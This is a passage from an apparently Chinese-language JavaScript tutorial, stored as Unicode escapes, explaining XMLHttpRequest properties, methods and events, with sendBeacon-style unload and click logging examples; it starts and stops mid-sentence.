\u4e8b\u4ef6\u65e0\u6cd5\u83b7\u53d6\u62a5\u9519\u4fe1\u606f\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u53ef\u80fd\u6ca1\u6709\u9519\u8bef\u5bf9\u8c61\uff0c\u6240\u4ee5\u8fd9\u6837\u53ea\u80fd\u663e\u793a\u62a5\u9519\u7684\u63d0\u793a\u3002 XMLHttpRequest.withCredentials \u00b6 XMLHttpRequest.withCredentials \u5c5e\u6027\u662f\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8de8\u57df\u8bf7\u6c42\u65f6\uff0c\u7528\u6237\u4fe1\u606f\uff08\u6bd4\u5982 Cookie \u548c\u8ba4\u8bc1\u7684 HTTP \u5934\u4fe1\u606f\uff09\u662f\u5426\u4f1a\u5305\u542b\u5728\u8bf7\u6c42\u4e4b\u4e2d\uff0c\u9ed8\u8ba4\u4e3a false \uff0c\u5373\u5411 example.com \u53d1\u51fa\u8de8\u57df\u8bf7\u6c42\u65f6\uff0c\u4e0d\u4f1a\u53d1\u9001 example.com \u8bbe\u7f6e\u5728\u672c\u673a\u4e0a\u7684 Cookie\uff08\u5982\u679c\u6709\u7684\u8bdd\uff09\u3002 \u5982\u679c\u9700\u8981\u8de8\u57df AJAX \u8bf7\u6c42\u53d1\u9001 Cookie\uff0c\u9700\u8981 withCredentials \u5c5e\u6027\u8bbe\u4e3a true \u3002\u6ce8\u610f\uff0c\u540c\u6e90\u7684\u8bf7\u6c42\u4e0d\u9700\u8981\u8bbe\u7f6e\u8fd9\u4e2a\u5c5e\u6027\u3002 1 2 3 4 var xhr = new XMLHttpRequest (); xhr . open ( 'GET' , 'http://example.com/' , true ); xhr . withCredentials = true ; xhr . send ( null ); \u4e3a\u4e86\u8ba9\u8fd9\u4e2a\u5c5e\u6027\u751f\u6548\uff0c\u670d\u52a1\u5668\u5fc5\u987b\u663e\u5f0f\u8fd4\u56de Access-Control-Allow-Credentials \u8fd9\u4e2a\u5934\u4fe1\u606f\u3002 1 Access - Control - Allow - Credentials : true withCredentials \u5c5e\u6027\u6253\u5f00\u7684\u8bdd\uff0c\u8de8\u57df\u8bf7\u6c42\u4e0d\u4ec5\u4f1a\u53d1\u9001 Cookie\uff0c\u8fd8\u4f1a\u8bbe\u7f6e\u8fdc\u7a0b\u4e3b\u673a\u6307\u5b9a\u7684 Cookie\u3002\u53cd\u4e4b\u4e5f\u6210\u7acb\uff0c\u5982\u679c withCredentials \u5c5e\u6027\u6ca1\u6709\u6253\u5f00\uff0c\u90a3\u4e48\u8de8\u57df\u7684 AJAX \u8bf7\u6c42\u5373\u4f7f\u660e\u786e\u8981\u6c42\u6d4f\u89c8\u5668\u8bbe\u7f6e Cookie\uff0c\u6d4f\u89c8\u5668\u4e5f\u4f1a\u5ffd\u7565\u3002 \u6ce8\u610f\uff0c\u811a\u672c\u603b\u662f\u9075\u5b88\u540c\u6e90\u653f\u7b56\uff0c\u65e0\u6cd5\u4ece document.cookie \u6216\u8005 HTTP \u56de\u5e94\u7684\u5934\u4fe1\u606f\u4e4b\u4e2d\uff0c\u8bfb\u53d6\u8de8\u57df\u7684 Cookie\uff0c withCredentials \u5c5e\u6027\u4e0d\u5f71\u54cd\u8fd9\u4e00\u70b9\u3002 XMLHttpRequest.upload \u00b6 XMLHttpRequest \u4e0d\u4ec5\u53ef\u4ee5\u53d1\u9001\u8bf7\u6c42\uff0c\u8fd8\u53ef\u4ee5\u53d1\u9001\u6587\u4ef6\uff0c\u8fd9\u5c31\u662f AJAX \u6587\u4ef6\u4e0a\u4f20\u3002\u53d1\u9001\u6587\u4ef6\u4ee5\u540e\uff0c\u901a\u8fc7 XMLHttpRequest.upload \u5c5e\u6027\u53ef\u4ee5\u5f97\u5230\u4e00\u4e2a\u5bf9\u8c61\uff0c\u901a\u8fc7\u89c2\u5bdf\u8fd9\u4e2a\u5bf9\u8c61\uff0c\u53ef\u4ee5\u5f97\u77e5\u4e0a\u4f20\u7684\u8fdb\u5c55\u3002\u4e3b\u8981\u65b9\u6cd5\u5c31\u662f\u76d1\u542c\u8fd9\u4e2a\u5bf9\u8c61\u7684\u5404\u79cd\u4e8b\u4ef6\uff1aloadstart\u3001loadend\u3001load\u3001abort\u3001error\u3001progress\u3001timeout\u3002 \u5047\u5b9a\u7f51\u9875\u4e0a\u6709\u4e00\u4e2a <progress> \u5143\u7d20\u3002 1 <progress min=\"0\" max=\"100\" value=\"0\">0% complete</progress> \u6587\u4ef6\u4e0a\u4f20\u65f6\uff0c\u5bf9 upload \u5c5e\u6027\u6307\u5b9a progress \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\uff0c\u5373\u53ef\u83b7\u5f97\u4e0a\u4f20\u7684\u8fdb\u5ea6\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 function upload ( blobOrFile ) { var xhr = new XMLHttpRequest (); xhr . open ( 'POST' , '/server' , true ); xhr . onload = function ( e ) {}; var progressBar = document . querySelector ( 'progress' ); xhr . upload . onprogress = function ( e ) { if ( e . lengthComputable ) { progressBar . value = ( e . loaded / e . total ) * 100 ; // \u517c\u5bb9\u4e0d\u652f\u6301 <progress> \u5143\u7d20\u7684\u8001\u5f0f\u6d4f\u89c8\u5668 progressBar . textContent = progressBar . value ; } }; xhr . send ( blobOrFile ); } upload ( new Blob ([ 'hello world' ], { type : 'text/plain' })); XMLHttpRequest \u7684\u5b9e\u4f8b\u65b9\u6cd5 \u00b6 XMLHttpRequest.open() \u00b6 XMLHttpRequest.open() \u65b9\u6cd5\u7528\u4e8e\u6307\u5b9a HTTP \u8bf7\u6c42\u7684\u53c2\u6570\uff0c\u6216\u8005\u8bf4\u521d\u59cb\u5316 XMLHttpRequest \u5b9e\u4f8b\u5bf9\u8c61\u3002\u5b83\u4e00\u5171\u53ef\u4ee5\u63a5\u53d7\u4e94\u4e2a\u53c2\u6570\u3002 1 2 3 4 5 6 7 void open ( string method , string url , optional boolean async , optional string user , optional string password ); method \uff1a\u8868\u793a HTTP \u52a8\u8bcd\u65b9\u6cd5\uff0c\u6bd4\u5982 GET \u3001 POST \u3001 PUT \u3001 DELETE \u3001 HEAD \u7b49\u3002 url : \u8868\u793a\u8bf7\u6c42\u53d1\u9001\u76ee\u6807 URL\u3002 async : \u5e03\u5c14\u503c\uff0c\u8868\u793a\u8bf7\u6c42\u662f\u5426\u4e3a\u5f02\u6b65\uff0c\u9ed8\u8ba4\u4e3a true \u3002\u5982\u679c\u8bbe\u4e3a false \uff0c\u5219 send() \u65b9\u6cd5\u53ea\u6709\u7b49\u5230\u6536\u5230\u670d\u52a1\u5668\u8fd4\u56de\u4e86\u7ed3\u679c\uff0c\u624d\u4f1a\u8fdb\u884c\u4e0b\u4e00\u6b65\u64cd\u4f5c\u3002\u8be5\u53c2\u6570\u53ef\u9009\u3002\u7531\u4e8e\u540c\u6b65 AJAX \u8bf7\u6c42\u4f1a\u9020\u6210\u6d4f\u89c8\u5668\u5931\u53bb\u54cd\u5e94\uff0c\u8bb8\u591a\u6d4f\u89c8\u5668\u5df2\u7ecf\u7981\u6b62\u5728\u4e3b\u7ebf\u7a0b\u4f7f\u7528\uff0c\u53ea\u5141\u8bb8 Worker \u91cc\u9762\u4f7f\u7528\u3002\u6240\u4ee5\uff0c\u8fd9\u4e2a\u53c2\u6570\u8f7b\u6613\u4e0d\u5e94\u8be5\u8bbe\u4e3a false \u3002 user \uff1a\u8868\u793a\u7528\u4e8e\u8ba4\u8bc1\u7684\u7528\u6237\u540d\uff0c\u9ed8\u8ba4\u4e3a\u7a7a\u5b57\u7b26\u4e32\u3002\u8be5\u53c2\u6570\u53ef\u9009\u3002 password \uff1a\u8868\u793a\u7528\u4e8e\u8ba4\u8bc1\u7684\u5bc6\u7801\uff0c\u9ed8\u8ba4\u4e3a\u7a7a\u5b57\u7b26\u4e32\u3002\u8be5\u53c2\u6570\u53ef\u9009\u3002 \u6ce8\u610f\uff0c\u5982\u679c\u5bf9\u4f7f\u7528\u8fc7 open() \u65b9\u6cd5\u7684 AJAX \u8bf7\u6c42\uff0c\u518d\u6b21\u4f7f\u7528\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u7b49\u540c\u4e8e\u8c03\u7528 abort() \uff0c\u5373\u7ec8\u6b62\u8bf7\u6c42\u3002 \u4e0b\u9762\u53d1\u9001 POST \u8bf7\u6c42\u7684\u4f8b\u5b50\u3002 1 2 var xhr = new XMLHttpRequest (); xhr . open ( 'POST' , encodeURI ( 'someURL' )); XMLHttpRequest.send() \u00b6 XMLHttpRequest.send() \u65b9\u6cd5\u7528\u4e8e\u5b9e\u9645\u53d1\u51fa HTTP \u8bf7\u6c42\u3002\u5b83\u7684\u53c2\u6570\u662f\u53ef\u9009\u7684\uff0c\u5982\u679c\u4e0d\u5e26\u53c2\u6570\uff0c\u5c31\u8868\u793a HTTP \u8bf7\u6c42\u53ea\u6709\u4e00\u4e2a URL\uff0c\u6ca1\u6709\u6570\u636e\u4f53\uff0c\u5178\u578b\u4f8b\u5b50\u5c31\u662f GET \u8bf7\u6c42\uff1b\u5982\u679c\u5e26\u6709\u53c2\u6570\uff0c\u5c31\u8868\u793a\u9664\u4e86\u5934\u4fe1\u606f\uff0c\u8fd8\u5e26\u6709\u5305\u542b\u5177\u4f53\u6570\u636e\u7684\u4fe1\u606f\u4f53\uff0c\u5178\u578b\u4f8b\u5b50\u5c31\u662f POST \u8bf7\u6c42\u3002 \u4e0b\u9762\u662f GET \u8bf7\u6c42\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 var xhr = new XMLHttpRequest (); xhr . open ( 'GET' , 'http://www.example.com/?id=' + encodeURIComponent ( id ), true ); xhr . send ( null ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c GET \u8bf7\u6c42\u7684\u53c2\u6570\uff0c\u4f5c\u4e3a\u67e5\u8be2\u5b57\u7b26\u4e32\u9644\u52a0\u5728 URL \u540e\u9762\u3002 \u4e0b\u9762\u662f\u53d1\u9001 POST \u8bf7\u6c42\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 var xhr = new XMLHttpRequest (); var data = 'email=' + encodeURIComponent ( email ) + '&password=' + encodeURIComponent ( password ); xhr . open ( 'POST' , 'http://www.example.com' , true ); xhr . setRequestHeader ( 'Content-Type' , 'application/x-www-form-urlencoded' ); xhr . send ( data ); \u6ce8\u610f\uff0c\u6240\u6709 XMLHttpRequest \u7684\u76d1\u542c\u4e8b\u4ef6\uff0c\u90fd\u5fc5\u987b\u5728 send() \u65b9\u6cd5\u8c03\u7528\u4e4b\u524d\u8bbe\u5b9a\u3002 send \u65b9\u6cd5\u7684\u53c2\u6570\u5c31\u662f\u53d1\u9001\u7684\u6570\u636e\u3002\u591a\u79cd\u683c\u5f0f\u7684\u6570\u636e\uff0c\u90fd\u53ef\u4ee5\u4f5c\u4e3a\u5b83\u7684\u53c2\u6570\u3002 1 2 3 4 5 6 void send (); void send ( ArrayBufferView data ); void send ( Blob data ); void send ( Document data ); void send ( String data ); void send ( FormData data ); \u5982\u679c send() \u53d1\u9001 DOM \u5bf9\u8c61\uff0c\u5728\u53d1\u9001\u4e4b\u524d\uff0c\u6570\u636e\u4f1a\u5148\u88ab\u4e32\u884c\u5316\u3002\u5982\u679c\u53d1\u9001\u4e8c\u8fdb\u5236\u6570\u636e\uff0c\u6700\u597d\u662f\u53d1\u9001 ArrayBufferView \u6216 Blob \u5bf9\u8c61\uff0c\u8fd9\u4f7f\u5f97\u901a\u8fc7 Ajax \u4e0a\u4f20\u6587\u4ef6\u6210\u4e3a\u53ef\u80fd\u3002 \u4e0b\u9762\u662f\u53d1\u9001\u8868\u5355\u6570\u636e\u7684\u4f8b\u5b50\u3002 FormData \u5bf9\u8c61\u53ef\u4ee5\u7528\u4e8e\u6784\u9020\u8868\u5355\u6570\u636e\u3002 1 2 3 4 5 6 7 8 9 var formData = new FormData (); formData . append ( 'username' , '\u5f20\u4e09' ); formData . append ( 'email' , 'zhangsan@example.com' ); formData . append ( 'birthDate' , 1940 ); var xhr = new XMLHttpRequest (); xhr . open ( 'POST' , '/register' ); xhr . send ( formData ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c FormData \u5bf9\u8c61\u6784\u9020\u4e86\u8868\u5355\u6570\u636e\uff0c\u7136\u540e\u4f7f\u7528 send() \u65b9\u6cd5\u53d1\u9001\u3002\u5b83\u7684\u6548\u679c\u4e0e\u53d1\u9001\u4e0b\u9762\u7684\u8868\u5355\u6570\u636e\u662f\u4e00\u6837\u7684\u3002 1 2 3 4 5 6 < form id = 'registration' name = 'registration' action = '/register' > < input type = 'text' name = 'username' value = '\u5f20\u4e09' > < input type = 'email' name = 'email' value = 'zhangsan@example.com' > < input type = 'number' name = 'birthDate' value = '1940' > < input type = 'submit' onclick = 'return sendForm(this.form);' > </ form > \u4e0b\u9762\u7684\u4f8b\u5b50\u662f\u4f7f\u7528 FormData \u5bf9\u8c61\u52a0\u5de5\u8868\u5355\u6570\u636e\uff0c\u7136\u540e\u518d\u53d1\u9001\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 function sendForm ( form ) { var formData = new FormData ( form ); formData . append ( 'csrf' , 'e69a18d7db1286040586e6da1950128c' ); var xhr = new XMLHttpRequest (); xhr . open ( 'POST' , form . action , true ); xhr . onload = function () { // ... }; xhr . send ( formData ); return false ; } var form = document . querySelector ( '#registration' ); sendForm ( form ); XMLHttpRequest.setRequestHeader() \u00b6 XMLHttpRequest.setRequestHeader() \u65b9\u6cd5\u7528\u4e8e\u8bbe\u7f6e\u6d4f\u89c8\u5668\u53d1\u9001\u7684 HTTP \u8bf7\u6c42\u7684\u5934\u4fe1\u606f\u3002\u8be5\u65b9\u6cd5\u5fc5\u987b\u5728 open() \u4e4b\u540e\u3001 send() \u4e4b\u524d\u8c03\u7528\u3002\u5982\u679c\u8be5\u65b9\u6cd5\u591a\u6b21\u8c03\u7528\uff0c\u8bbe\u5b9a\u540c\u4e00\u4e2a\u5b57\u6bb5\uff0c\u5219\u6bcf\u4e00\u6b21\u8c03\u7528\u7684\u503c\u4f1a\u88ab\u5408\u5e76\u6210\u4e00\u4e2a\u5355\u4e00\u7684\u503c\u53d1\u9001\u3002 \u8be5\u65b9\u6cd5\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\u3002\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5934\u4fe1\u606f\u7684\u5b57\u6bb5\u540d\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u5b57\u6bb5\u503c\u3002 1 2 3 xhr . setRequestHeader ( 'Content-Type' , 'application/json' ); xhr . setRequestHeader ( 'Content-Length' , JSON . stringify ( data ). length ); xhr . send ( JSON . stringify ( data )); \u4e0a\u9762\u4ee3\u7801\u9996\u5148\u8bbe\u7f6e\u5934\u4fe1\u606f Content-Type \uff0c\u8868\u793a\u53d1\u9001 JSON \u683c\u5f0f\u7684\u6570\u636e\uff1b\u7136\u540e\u8bbe\u7f6e Content-Length \uff0c\u8868\u793a\u6570\u636e\u957f\u5ea6\uff1b\u6700\u540e\u53d1\u9001 JSON \u6570\u636e\u3002 XMLHttpRequest.overrideMimeType() \u00b6 XMLHttpRequest.overrideMimeType() \u65b9\u6cd5\u7528\u6765\u6307\u5b9a MIME \u7c7b\u578b\uff0c\u8986\u76d6\u670d\u52a1\u5668\u8fd4\u56de\u7684\u771f\u6b63\u7684 MIME \u7c7b\u578b\uff0c\u4ece\u800c\u8ba9\u6d4f\u89c8\u5668\u8fdb\u884c\u4e0d\u4e00\u6837\u7684\u5904\u7406\u3002\u4e3e\u4f8b\u6765\u8bf4\uff0c\u670d\u52a1\u5668\u8fd4\u56de\u7684\u6570\u636e\u7c7b\u578b\u662f text/xml \uff0c\u7531\u4e8e\u79cd\u79cd\u539f\u56e0\u6d4f\u89c8\u5668\u89e3\u6790\u4e0d\u6210\u529f\u62a5\u9519\uff0c\u8fd9\u65f6\u5c31\u62ff\u4e0d\u5230\u6570\u636e\u4e86\u3002\u4e3a\u4e86\u62ff\u5230\u539f\u59cb\u6570\u636e\uff0c\u6211\u4eec\u53ef\u4ee5\u628a MIME \u7c7b\u578b\u6539\u6210 text/plain \uff0c\u8fd9\u6837\u6d4f\u89c8\u5668\u5c31\u4e0d\u4f1a\u53bb\u81ea\u52a8\u89e3\u6790\uff0c\u4ece\u800c\u6211\u4eec\u5c31\u53ef\u4ee5\u62ff\u5230\u539f\u59cb\u6587\u672c\u4e86\u3002 1 xhr . overrideMimeType ( 'text/plain' ) \u6ce8\u610f\uff0c\u8be5\u65b9\u6cd5\u5fc5\u987b\u5728 send() \u65b9\u6cd5\u4e4b\u524d\u8c03\u7528\u3002 \u4fee\u6539\u670d\u52a1\u5668\u8fd4\u56de\u7684\u6570\u636e\u7c7b\u578b\uff0c\u4e0d\u662f\u6b63\u5e38\u60c5\u51b5\u4e0b\u5e94\u8be5\u91c7\u53d6\u7684\u65b9\u6cd5\u3002\u5982\u679c\u5e0c\u671b\u670d\u52a1\u5668\u8fd4\u56de\u6307\u5b9a\u7684\u6570\u636e\u7c7b\u578b\uff0c\u53ef\u4ee5\u7528 responseType \u5c5e\u6027\u544a\u8bc9\u670d\u52a1\u5668\uff0c\u5c31\u50cf\u4e0b\u9762\u7684\u4f8b\u5b50\u3002\u53ea\u6709\u5728\u670d\u52a1\u5668\u65e0\u6cd5\u8fd4\u56de\u67d0\u79cd\u6570\u636e\u7c7b\u578b\u65f6\uff0c\u624d\u4f7f\u7528 overrideMimeType() \u65b9\u6cd5\u3002 1 2 3 4 5 6 7 8 var xhr = new XMLHttpRequest (); xhr . onload = function ( e ) { var arraybuffer = xhr . response ; // ... } xhr . open ( 'GET' , url ); xhr . responseType = 'arraybuffer' ; xhr . send (); XMLHttpRequest.getResponseHeader() \u00b6 XMLHttpRequest.getResponseHeader() \u65b9\u6cd5\u8fd4\u56de HTTP \u5934\u4fe1\u606f\u6307\u5b9a\u5b57\u6bb5\u7684\u503c\uff0c\u5982\u679c\u8fd8\u6ca1\u6709\u6536\u5230\u670d\u52a1\u5668\u56de\u5e94\u6216\u8005\u6307\u5b9a\u5b57\u6bb5\u4e0d\u5b58\u5728\uff0c\u8fd4\u56de null \u3002\u8be5\u65b9\u6cd5\u7684\u53c2\u6570\u4e0d\u533a\u5206\u5927\u5c0f\u5199\u3002 1 2 3 4 5 6 7 8 function getHeaderTime () { console . log ( this . getResponseHeader ( \"Last-Modified\" )); } var xhr = new XMLHttpRequest (); xhr . open ( 'HEAD' , 'yourpage.html' ); xhr . onload = getHeaderTime ; xhr . send (); \u5982\u679c\u6709\u591a\u4e2a\u5b57\u6bb5\u540c\u540d\uff0c\u5b83\u4eec\u7684\u503c\u4f1a\u88ab\u8fde\u63a5\u4e3a\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u6bcf\u4e2a\u5b57\u6bb5\u4e4b\u95f4\u4f7f\u7528\u201c\u9017\u53f7+\u7a7a\u683c\u201d\u5206\u9694\u3002 XMLHttpRequest.getAllResponseHeaders() \u00b6 XMLHttpRequest.getAllResponseHeaders() \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u670d\u52a1\u5668\u53d1\u6765\u7684\u6240\u6709 HTTP \u5934\u4fe1\u606f\u3002\u683c\u5f0f\u4e3a\u5b57\u7b26\u4e32\uff0c\u6bcf\u4e2a\u5934\u4fe1\u606f\u4e4b\u95f4\u4f7f\u7528 CRLF \u5206\u9694\uff08\u56de\u8f66+\u6362\u884c\uff09\uff0c\u5982\u679c\u6ca1\u6709\u6536\u5230\u670d\u52a1\u5668\u56de\u5e94\uff0c\u8be5\u5c5e\u6027\u4e3a null \u3002\u5982\u679c\u53d1\u751f\u7f51\u7edc\u9519\u8bef\uff0c\u8be5\u5c5e\u6027\u4e3a\u7a7a\u5b57\u7b26\u4e32\u3002 1 2 3 4 5 6 7 8 9 var xhr = new XMLHttpRequest (); xhr . open ( 'GET' , 'foo.txt' , true ); xhr . send (); xhr . onreadystatechange = function () { if ( this . readyState === 4 ) { var headers = xhr . getAllResponseHeaders (); } } \u4e0a\u9762\u4ee3\u7801\u7528\u4e8e\u83b7\u53d6\u670d\u52a1\u5668\u8fd4\u56de\u7684\u6240\u6709\u5934\u4fe1\u606f\u3002\u5b83\u53ef\u80fd\u662f\u4e0b\u9762\u8fd9\u6837\u7684\u5b57\u7b26\u4e32\u3002 1 2 3 4 5 6 7 8 9 10 11 date: Fri, 08 Dec 2017 21:04:30 GMT\\r\\n content-encoding: gzip\\r\\n x-content-type-options: nosniff\\r\\n server: meinheld/0.6.1\\r\\n x-frame-options: DENY\\r\\n content-type: text/html; charset=utf-8\\r\\n connection: keep-alive\\r\\n strict-transport-security: max-age=63072000\\r\\n vary: Cookie, Accept-Encoding\\r\\n content-length: 6502\\r\\n x-xss-protection: 1; mode=block\\r\\n \u7136\u540e\uff0c\u5bf9\u8fd9\u4e2a\u5b57\u7b26\u4e32\u8fdb\u884c\u5904\u7406\u3002 1 2 3 4 5 6 7 8 9 10 11 var arr = headers . trim (). split ( /[\\r\\n]+/ ); var headerMap = {}; arr . forEach ( function ( line ) { var parts = line . split ( ': ' ); var header = parts . shift (); var value = parts . join ( ': ' ); headerMap [ header ] = value ; }); headerMap [ 'content-length' ] // \"6502\" XMLHttpRequest.abort() \u00b6 XMLHttpRequest.abort() \u65b9\u6cd5\u7528\u6765\u7ec8\u6b62\u5df2\u7ecf\u53d1\u51fa\u7684 HTTP \u8bf7\u6c42\u3002\u8c03\u7528\u8fd9\u4e2a\u65b9\u6cd5\u4ee5\u540e\uff0c readyState \u5c5e\u6027\u53d8\u4e3a 4 \uff0c status \u5c5e\u6027\u53d8\u4e3a 0 \u3002 1 2 3 4 5 6 7 8 var xhr = new XMLHttpRequest (); xhr . open ( 'GET' , 'http://www.example.com/page.php' , true ); setTimeout ( function () { if ( xhr ) { xhr . abort (); xhr = null ; } }, 5000 ); \u4e0a\u9762\u4ee3\u7801\u5728\u53d1\u51fa5\u79d2\u4e4b\u540e\uff0c\u7ec8\u6b62\u4e00\u4e2a AJAX \u8bf7\u6c42\u3002 XMLHttpRequest \u5b9e\u4f8b\u7684\u4e8b\u4ef6 \u00b6 readyStateChange \u4e8b\u4ef6 \u00b6 readyState \u5c5e\u6027\u7684\u503c\u53d1\u751f\u6539\u53d8\uff0c\u5c31\u4f1a\u89e6\u53d1 readyStateChange \u4e8b\u4ef6\u3002 \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 onReadyStateChange \u5c5e\u6027\uff0c\u6307\u5b9a\u8fd9\u4e2a\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\uff0c\u5bf9\u4e0d\u540c\u72b6\u6001\u8fdb\u884c\u4e0d\u540c\u5904\u7406\u3002\u5c24\u5176\u662f\u5f53\u72b6\u6001\u53d8\u4e3a 4 \u7684\u65f6\u5019\uff0c\u8868\u793a\u901a\u4fe1\u6210\u529f\uff0c\u8fd9\u65f6\u56de\u8c03\u51fd\u6570\u5c31\u53ef\u4ee5\u5904\u7406\u670d\u52a1\u5668\u4f20\u9001\u56de\u6765\u7684\u6570\u636e\u3002 progress \u4e8b\u4ef6 \u00b6 \u4e0a\u4f20\u6587\u4ef6\u65f6\uff0cXMLHttpRequest \u5b9e\u4f8b\u5bf9\u8c61\u672c\u8eab\u548c\u5b9e\u4f8b\u7684 upload \u5c5e\u6027\uff0c\u90fd\u6709\u4e00\u4e2a progress \u4e8b\u4ef6\uff0c\u4f1a\u4e0d\u65ad\u8fd4\u56de\u4e0a\u4f20\u7684\u8fdb\u5ea6\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 var xhr = new XMLHttpRequest (); function updateProgress ( oEvent ) { if ( oEvent . lengthComputable ) { var percentComplete = oEvent . loaded / oEvent . total ; } else { console . log ( '\u65e0\u6cd5\u8ba1\u7b97\u8fdb\u5c55' ); } } xhr . addEventListener ( 'progress' , updateProgress ); xhr . open (); load \u4e8b\u4ef6\u3001error \u4e8b\u4ef6\u3001abort \u4e8b\u4ef6 \u00b6 load \u4e8b\u4ef6\u8868\u793a\u670d\u52a1\u5668\u4f20\u6765\u7684\u6570\u636e\u63a5\u6536\u5b8c\u6bd5\uff0cerror \u4e8b\u4ef6\u8868\u793a\u8bf7\u6c42\u51fa\u9519\uff0cabort \u4e8b\u4ef6\u8868\u793a\u8bf7\u6c42\u88ab\u4e2d\u65ad\uff08\u6bd4\u5982\u7528\u6237\u53d6\u6d88\u8bf7\u6c42\uff09\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 var xhr = new XMLHttpRequest (); xhr . addEventListener ( 'load' , transferComplete ); xhr . addEventListener ( 'error' , transferFailed ); xhr . addEventListener ( 'abort' , transferCanceled ); xhr . open (); function transferComplete () { console . log ( '\u6570\u636e\u63a5\u6536\u5b8c\u6bd5' ); } function transferFailed () { console . log ( '\u6570\u636e\u63a5\u6536\u51fa\u9519' ); } function transferCanceled () { console . log ( '\u7528\u6237\u53d6\u6d88\u63a5\u6536' ); } loadend \u4e8b\u4ef6 \u00b6 abort \u3001 load \u548c error \u8fd9\u4e09\u4e2a\u4e8b\u4ef6\uff0c\u4f1a\u4f34\u968f\u4e00\u4e2a loadend \u4e8b\u4ef6\uff0c\u8868\u793a\u8bf7\u6c42\u7ed3\u675f\uff0c\u4f46\u4e0d\u77e5\u9053\u5176\u662f\u5426\u6210\u529f\u3002 1 2 3 4 5 xhr . addEventListener ( 'loadend' , loadEnd ); function loadEnd ( e ) { console . log ( '\u8bf7\u6c42\u7ed3\u675f\uff0c\u72b6\u6001\u672a\u77e5' ); } timeout \u4e8b\u4ef6 \u00b6 \u670d\u52a1\u5668\u8d85\u8fc7\u6307\u5b9a\u65f6\u95f4\u8fd8\u6ca1\u6709\u8fd4\u56de\u7ed3\u679c\uff0c\u5c31\u4f1a\u89e6\u53d1 timeout \u4e8b\u4ef6\uff0c\u5177\u4f53\u7684\u4f8b\u5b50\u53c2\u89c1 timeout \u5c5e\u6027\u4e00\u8282\u3002 Navigator.sendBeacon() \u00b6 \u7528\u6237\u5378\u8f7d\u7f51\u9875\u7684\u65f6\u5019\uff0c\u6709\u65f6\u9700\u8981\u5411\u670d\u52a1\u5668\u53d1\u4e00\u4e9b\u6570\u636e\u3002\u5f88\u81ea\u7136\u7684\u505a\u6cd5\u662f\u5728 unload \u4e8b\u4ef6\u6216 beforeunload \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u91cc\u9762\uff0c\u4f7f\u7528 XMLHttpRequest \u5bf9\u8c61\u53d1\u9001\u6570\u636e\u3002\u4f46\u662f\uff0c\u8fd9\u6837\u505a\u4e0d\u662f\u5f88\u53ef\u9760\uff0c\u56e0\u4e3a XMLHttpRequest \u5bf9\u8c61\u662f\u5f02\u6b65\u53d1\u9001\uff0c\u5f88\u53ef\u80fd\u5728\u5b83\u5373\u5c06\u53d1\u9001\u7684\u65f6\u5019\uff0c\u9875\u9762\u5df2\u7ecf\u5378\u8f7d\u4e86\uff0c\u4ece\u800c\u5bfc\u81f4\u53d1\u9001\u53d6\u6d88\u6216\u8005\u53d1\u9001\u5931\u8d25\u3002 \u89e3\u51b3\u65b9\u6cd5\u5c31\u662f unload \u4e8b\u4ef6\u91cc\u9762\uff0c\u52a0\u4e00\u4e9b\u5f88\u8017\u65f6\u7684\u540c\u6b65\u64cd\u4f5c\u3002\u8fd9\u6837\u5c31\u80fd\u7559\u51fa\u8db3\u591f\u7684\u65f6\u95f4\uff0c\u4fdd\u8bc1\u5f02\u6b65 AJAX \u80fd\u591f\u53d1\u9001\u6210\u529f\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 function log () { let xhr = new XMLHttpRequest (); xhr . open ( 'post' , '/log' , true ); xhr . setRequestHeader ( 'Content-Type' , 'application/x-www-form-urlencoded' ); xhr . send ( 'foo=bar' ); } window . addEventListener ( 'unload' , function ( event ) { log (); // a time-consuming operation for ( let i = 1 ; i < 10000 ; i ++ ) { for ( let m = 1 ; m < 10000 ; m ++ ) { continue ; } } }); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5f3a\u5236\u6267\u884c\u4e86\u4e00\u6b21\u53cc\u91cd\u5faa\u73af\uff0c\u62d6\u957f\u4e86 unload \u4e8b\u4ef6\u7684\u6267\u884c\u65f6\u95f4\uff0c\u5bfc\u81f4\u5f02\u6b65 AJAX \u80fd\u591f\u53d1\u9001\u6210\u529f\u3002 \u7c7b\u4f3c\u7684\u8fd8\u53ef\u4ee5\u4f7f\u7528 setTimeout \u3002\u4e0b\u9762\u662f\u8ffd\u8e2a\u7528\u6237\u70b9\u51fb\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // HTML \u4ee3\u7801\u5982\u4e0b // <a id=\"target\" href=\"https://baidu.com\">click</a> const clickTime = 350 ; const theLink = document . getElementById ( 'target' ); function log () { let xhr = new XMLHttpRequest (); xhr . open ( 'post' , '/log' , true ); xhr . setRequestHeader ( 'Content-Type' , 'application/x-www-form-urlencoded' ); xhr . send ( 'foo=bar' ); } theLink . addEventListener ( 'click' , function ( event ) { event . preventDefault (); log (); setTimeout ( function () { window . location . href = theLink . getAttribute ( 'href' ); }, clickTime ); }); \u4e0a\u9762\u4ee3\u7801\u4f7f\u7528 setTimeout 